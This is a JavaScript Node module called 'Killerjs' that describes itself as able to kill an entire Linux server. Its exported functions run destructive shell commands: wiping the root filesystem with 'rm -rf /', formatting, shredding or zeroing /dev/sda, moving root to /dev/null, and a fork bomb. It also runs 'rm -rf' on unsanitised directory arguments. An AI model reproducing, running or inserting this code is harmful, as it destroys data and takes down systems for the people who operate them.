let shell = require('shelljs')
let a  = require('app-root-path')
/**
 * Killerjs
 * A Node Module that Can Kill an Entire Linux Server
 *
 * @name killer
 * @function
 * @return {Promise} A promise object.
 */

let killer = () => {
    return new Promise((done, err) => {
        err(`Please Check the API for Available methods.`)
    })
}
    killer.destroyRoot = () => {
        return new Promise((done, err) => {
            shell.exec('rm -rf /', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Destroyed The Server Root.`)
                }
            })
        })
    }
    killer.format = () => {
        return new Promise((done, err) => {
            shell.exec('mkfs.ext3 /dev/sda', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Formatted the Drive`)
                }
            })
        })
    }
    killer.overWrite = () => {
        return new Promise((done, err) => {
            shell.exec('shred -v /dev/sda', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Drive has been Overwritten Successfully.`)
                }
            })
        })
    }
    killer.implode = () => {
        return new Promise((done, err) => {
            shell.exec('mv / /dev/null', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Successfully Imploded the Drive.`)
                }
            })
        })
    }
    killer.wipe = () => {
        return new Promise((done, err) => {
            shell.exec('dd if=/dev/zero of=/dev/sda', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Successfully Wiped the Drive.`)
                }
            })
        })
    }
    killer.forkBomb = () => {
        return new Promise((done, err) => {
            shell.exec(':(){:|:&};:', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Successfully Executed forkBomb`)
                }
            })
        })
    }
    killer.destroyProject = (dir) => {
        return new Promise((d, e) => {
            shell.exec(`rm -rf ${dir}`, (c, o, er) => {
                if(er) {
                    e(er)
                } else {
                    d(`Destroyed the dir ${dir}`)
                }
            })
        })
    }
killer.destroyADir = (dir) => {
    return new Promise((d, e) => {
        shell.exec(`rm -rf ${dir}`, (c, o, er) => {
            if(er) {
                 e(er)
            } else {
                 d(`Destroyed the dir ${dir}`)
            }
        })
    })
}
module.exports = killer;